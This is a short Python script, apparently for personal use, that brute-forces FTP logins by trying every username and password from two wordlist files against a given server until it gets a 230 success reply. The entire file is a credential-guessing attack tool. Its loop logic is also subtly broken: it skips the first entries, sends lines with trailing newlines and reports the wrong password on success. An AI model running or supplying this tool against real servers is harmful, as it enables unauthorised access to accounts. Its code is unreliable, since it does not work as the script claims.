#!/usr/bin/python

'''
Simple ftp brute force attack using  dictionary files for usernames and passwords
    File name: brute_ftp.py
    Author: Dunia MR
    Date created: 15/03/2024
    Date created: 15/03/2024
    Python Version: 1.0.0
'''

import re
import sys
import socket
import argparse
from ipaddress import ip_address



def get_args():
    parser = argparse.ArgumentParser(description='Process arguments')
    parser.add_argument("-v", "--version", help="0.1", action="store_true")
    parser.add_argument('-d', '--debug', help='Increase verbosity to ease debugging process', action="store_true")
    parser.add_argument('-s',"--server", type=ip_address, help='address to use', required=True)
    parser.add_argument('-p','--port', nargs='?', default="21",type=int)
    parser.add_argument('-u', '--usernames', metavar='USERNAMES_FILE', help='usernames file',required=True);
    parser.add_argument('-pass', '--passwords', metavar='PASSWORDS_FILE', help='passwords file',required=True);
    args = parser.parse_args()
    version = args.version
    debug = args.debug
    server = args.server
    port = args.port
    usernames_file = args.usernames
    passwords_file = args.passwords
    return version, debug, server, port, usernames_file, passwords_file

def connect(username,password,server,port,v=False):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if debug:
        print ("[*] Trying {} : {}".format(username,password))
    s.connect((str(server),port))
    data = s.recv(1024)
    s.send(('USER '+ username + '\r\n').encode())
    data = s.recv(1024)
    s.send(('PASS ' + password + '\r\n').encode())
    data = s.recv(3)
    s.send(('QUIT\r\n').encode())
    s.close()
    return data

version, debug, server, port, usernames_file, passwords_file  = get_args()

if server and port and usernames_file and passwords_file:
    with open(usernames_file) as fu:
        username = fu.readline()
        cnt = 1
        while username:
            if debug:
                print("Username {}: {}".format(cnt, username.strip()))
            username = fu.readline()
            cnt += 1
            with open(passwords_file) as fp:
                password = fp.readline()
                pcnt = 1
                while password:
                    print("Password {}: {}".format(pcnt, password.strip()))
                    password = fp.readline()
                    pcnt += 1
                    attempt = connect(username, password, server, port, debug)
                    if attempt == b'230':
                        print ("[*] Password found: {} -> ".format(password))
                        sys.exit(0)
